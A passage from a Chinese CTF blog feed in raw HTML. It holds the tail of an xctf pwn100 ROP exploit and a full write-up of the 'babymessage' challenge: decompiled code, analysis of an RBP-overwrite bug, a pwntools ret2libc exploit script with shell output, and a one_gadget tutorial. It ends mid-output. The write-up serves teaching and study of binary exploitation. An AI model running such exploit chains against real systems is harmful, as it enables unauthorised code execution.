punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">0x40</span>payload1 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">7</span>   <span class="token operator">//</span>本来放<span class="token number">8</span>个A填充RBP但是不知到为啥会占用下面地址的内存，从而无法实现跳转，大佬请留言payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>  <span class="token operator">//</span>binsh真实地址payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>  <span class="token operator">//</span>system真实地址payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>  payload1 <span class="token operator">+=</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x4</span> bytes<span class="token operator">:</span>    <span class="token string">'bye~'</span>bye<span class="token operator">~</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x1a</span> bytes<span class="token operator">:</span>    <span class="token string">'\n'</span>    <span class="token string">'/bin/sh: 1: B: not found\n'</span><span class="token operator">/</span>bin<span class="token operator">/</span>sh<span class="token operator">:</span> <span class="token number">1</span><span class="token operator">:</span> B<span class="token operator">:</span> not found$ ls<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x3</span> bytes<span class="token operator">:</span>    <span class="token string">'ls\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x24</span> bytes<span class="token operator">:</span>    <span class="token string">'bin\n'</span>    <span class="token string">'dev\n'</span>    <span class="token string">'flag\n'</span>    <span class="token string">'lib\n'</span>    <span class="token string">'lib32\n'</span>    <span class="token string">'lib64\n'</span>    <span class="token string">'pwn100\n'</span>bindevflagliblib32lib64pwn100</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8月国赛-babymessage--one_gadget</title>
      <link href="/2020/09/01/8-yue-guo-sai-babymessage-one-gadget/"/>
      <url>/2020/09/01/8-yue-guo-sai-babymessage-one-gadget/</url>
      
        <content type="html"><![CDATA[<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>国赛$ checksec babymessage<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/\xe5\x9b\xbd\xe8\xb5\x9b/babymessage'</span>    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    No canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x3fe000</span><span class="token punctuation">)</span>基本操作</code></pre><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><pre class=" language-c"><code class="language-c">main函数：<span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                       <span class="token comment" spellcheck="true">// 菜单输出</span>  <span class="token function">work</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>work函数：__int64 <span class="token function">work</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>  bss_mess <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> bss_mm <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bss_mm<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> bss_mm <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token function">leave_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment" spellcheck="true">// 最多读入4个字节</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> bss_mm <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">256</span> <span class="token punctuation">)</span>          v1 <span class="token operator">=</span> <span class="token number">256</span><span class="token punctuation">;</span>        <span class="token function">leave_message</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment" spellcheck="true">// 读入信息到bss_buf</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> bss_mm <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">show</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> bss_mm <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invalid choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span>leave_name函数：__int64 <span class="token function">leave_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"name: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  bss_name<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> bss_name<span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//read函数读入4个字节到bss_name段，返回值为5   bss_name[5] = 0相当于加了个边界</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"done!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span>leave_message函数：__int64 __fastcall <span class="token function">leave_message</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST14_4</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"message: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//存在微小溢出</span>  <span class="token function">strncpy</span><span class="token punctuation">(</span>bss_mess<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  bss_mess<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//加边界截至符</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"done!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span>show函数：__int64 __fastcall <span class="token function">show</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s says: "</span><span class="token punctuation">,</span> bss_name<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> bss_mess<span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>全局变量很多此处列出主要全局变量位置关系：</strong></p><pre class=" language-java"><code class="language-java"><span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000006010C0 bss_mm          dd <span class="token operator">?</span>                    <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> work<span class="token operator">+</span><span class="token number">19</span>↑r<span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000006010C0                                         <span class="token punctuation">;</span> work<span class="token operator">+</span><span class="token number">31</span>↑o <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000006010C4                 align <span class="token number">8</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000006010C8 <span class="token punctuation">;</span> <span class="token keyword">char</span> <span class="token operator">*</span>bss_mess<span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000006010C8 bss_mess        dq <span class="token operator">?</span>                    <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> leave_message<span class="token operator">+</span><span class="token number">3F</span>↑r<span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000006010C8                                         <span class="token punctuation">;</span> leave_message<span class="token operator">+</span><span class="token number">59</span>↑r <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000006010D0 <span class="token punctuation">;</span> _BYTE bss_name<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000006010D0 bss_name        db 10h <span class="token function">dup</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token punctuation">)</span>           <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> leave_name<span class="token operator">+</span><span class="token number">15</span>↑o<span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000006010D0                                         <span class="token punctuation">;</span> leave_name<span class="token operator">+</span>2E↑o <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000006010D0 _bss            ends<span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000006010D0</code></pre><p>差不多都是8个字节大小</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li>IDA字符串表中没有system，/bin/sh，更没有后门函数。题目给出libc文件，应该是要ret2libc</li><li>整个程序看起来很漂亮，但是有两个刺眼的地方<ul><li>work函数中if ( v1 &gt; 256 ） v1 = 256;这句话很完全没必要存在，加上下面：leave_message(v1);这个函数，如果v1成功等于256那么leave_message(v1)函数就存在很大的溢出量了</li><li>leave_message(v1)函数中读入的字符数量用来覆盖RBP没问题</li></ul></li><li>引入时钟大佬模块(doge)</li><li>在IDA汇编代码进入work函数中的if ( v1 &gt; 256 )判断，发现：<pre class=" language-java"><code class="language-java"><span class="token punctuation">.</span>text<span class="token operator">:</span>000000000040091A var_4           <span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">4</span>     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>text<span class="token operator">:</span>000000000040097A                 mov     eax<span class="token punctuation">,</span> cs<span class="token operator">:</span>bss_mm<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000400980</span>                 cmp     eax<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000400983</span>                 jnz     <span class="token keyword">short</span> loc_4009A1<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000400985</span>                 cmp     <span class="token punctuation">[</span>rbp<span class="token operator">+</span>var_4<span class="token punctuation">]</span><span class="token punctuation">,</span> 100h   <span class="token comment" spellcheck="true">//**************************</span><span class="token punctuation">.</span>text<span class="token operator">:</span>000000000040098C                 jle     <span class="token keyword">short</span> leav_message<span class="token punctuation">.</span>text<span class="token operator">:</span>000000000040098E                 mov     <span class="token punctuation">[</span>rbp<span class="token operator">+</span>var_4<span class="token punctuation">]</span><span class="token punctuation">,</span> 100h</code></pre>var_4 = -4  在cmp时 就是利用RBP-4处地址的值来和0x100执行 ，结合f5伪代码，此处地址的值大于0x100那么==&gt;v1 == 0x100 ,那么leave_message函数能过实现可控溢出</li><li>而我们在执行leave_messsage模块时可以控制RBP，然后返回到work函数，也是说在leave_messsage中覆盖了RBP也就时覆盖了work函数中的RBP。</li><li>再进一步：cmp     [rbp+var_4], 100h 时比较对象[rbp+var_4]是可控的</li></ul><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>第一次执行leave_messsage时构造payload使得RBP指向一个可控的位置，恰好这里使用的关键变量都是全局变量在bss段</li><li>在该可控位置输入字符串，这样其在bss中的二进制数可以大于256</li><li>再次执行leave_messsage函数<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">256</span> <span class="token punctuation">)</span>        v1 <span class="token operator">=</span> <span class="token number">256</span><span class="token punctuation">;</span>这个判断就会成立，进入下面的语句使得v1<span class="token operator">==</span><span class="token number">256</span></code></pre></li><li>构造payload 泄露某函数真实地址</li><li>获取licb地址，system，/bin/sh地址，设置返回地址为start，准备get_shell</li><li>故技重施让v1==256</li><li>执行leave_messsage函数，构造payload获取shell</li></ul><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>libc_0 <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.27.so'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'babymessage'</span><span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>start <span class="token operator">=</span> <span class="token number">0x0000000004006E0</span> pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400ac3</span><span class="token comment" spellcheck="true">#one_gadget_off = 0x4f3c2</span>one_gadget_off_0 <span class="token operator">=</span> <span class="token number">0x10a45c</span>one_gadget_off <span class="token operator">=</span> <span class="token number">0x4f3c2</span>ret <span class="token operator">=</span> <span class="token number">0x0000000000400646</span><span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">name</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name: '</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">message</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>n<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babymessage'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print sh.recv()</span>name<span class="token punctuation">(</span><span class="token string">'cccc'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">8</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000006010D0</span><span class="token operator">+</span><span class="token number">0x4</span><span class="token punctuation">)</span>  <span class="token operator">//</span>message<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span>message<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'done!\n\n'</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>libc_addr_0 <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc_0<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>bin_sh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>one_gadget_addr <span class="token operator">=</span>libc_addr_0 <span class="token operator">+</span>  one_gadget_off_0 <span class="token keyword">print</span> <span class="token string">"one_gadget_addr==>"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>one_gadget_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"puts_addr==>"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print sh.recv()</span>name<span class="token punctuation">(</span><span class="token string">'cccc'</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">8</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000006010D0</span><span class="token operator">+</span><span class="token number">0x4</span><span class="token punctuation">)</span>message<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print sh.recv()</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>message<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print sh.recv()</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>payload += p64(0x0000000006010D0+0x4)这里加4然后到那个if判断时会减4 ：cmp     [rbp+var_4], 100h。这样0x0000000006010D0地址处的值就是我们的操作数，这里就是bss_name地址。<br>结果：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x11</span> bytes<span class="token operator">:</span>    <span class="token string">'message: \n'</span>    <span class="token string">'done!\n'</span>    <span class="token string">'\n'</span>message<span class="token operator">:</span> done<span class="token operator">!</span>$ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'hunter\n'</span>hunter$  </code></pre><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP~~"></a>EXP~~</h3><ul><li>针对模块式程序，我们写EXP也最好写对应的自定义函数来调用</li><li>面对有很多输出语句的程序别对sh.recv()太执着，context.log_level = ‘debug’可以帮忙解决（因为这个我的EXP，失败了很多次）</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个题的关键就在于如何使得leave_message函数变成高危栈溢出漏洞函数，主要利用了子函数的小漏洞（此处子函数存在对RBP的修改漏洞）返回后对上级函数的影响（此处为RBP保持不变）</p><ul><li>所以当没有思路时可以在汇编层思考</li><li>上级函数与子函数之间某些寄存器的关联（常见的就是RBP/EBP） </li></ul><h2 id="one-gadget工具"><a href="#one-gadget工具" class="headerlink" title="one_gadget工具"></a>one_gadget工具</h2><p>libc中带有很多gadget，控制程序跳转到这些位置执行并满足一定的条件就可以拿到shell。</p><h3 id="万能one-gadget"><a href="#万能one-gadget" class="headerlink" title="万能one_gadget"></a>万能one_gadget</h3><p>指令：one_gadget libc文件</p><pre class=" language-c"><code class="language-c">hunter@hunter<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>国赛$ one_gadget libc<span class="token number">-2.27</span><span class="token punctuation">.</span>so   <span class="token comment" spellcheck="true">//上面题目的libc文件</span><span class="token number">0x4f365</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  rsp <span class="token operator">&amp;</span> <span class="token number">0xf</span> <span class="token operator">==</span> <span class="token number">0</span>  rcx <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token number">0x4f3c2</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  <span class="token punctuation">[</span>rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token number">0x10a45c</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>constraints<span class="token punctuation">:</span>  <span class="token punctuation">[</span>rsp<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span></code></pre><p>可以看到这里显示出这些获取shell的函数地址偏移，只要加上libc_addr就可以用了。<br>注意到他们下面都有constraints 即使用条件  ，这三个中条件最容易的就是0x4f3c2 的[rsp+0x40] == NULL，也就是说在跳转到这个函数时[rsp+0x40] 栈地址处要为\x00，我们可以用gdb.attach(sh)来进行调试，如果不满足就多放几个ret调整，使得[rsp+0x40]处恰好为NULL</p><h3 id="其他one-gadget"><a href="#其他one-gadget" class="headerlink" title="其他one_gadget"></a>其他one_gadget</h3><p>指令：后面加-l2参数可以找到更多的gadget。条件可能比较苛刻</p><pre class=" language-c"><code class="language-c">hunter@hunter<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>国赛$ one_gadget libc<span class="token number">-2.27</span><span class="token punctuation">.</span>so  <span class="token operator">-</span>l2<span class="token number">0x4f365</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x40</span><span 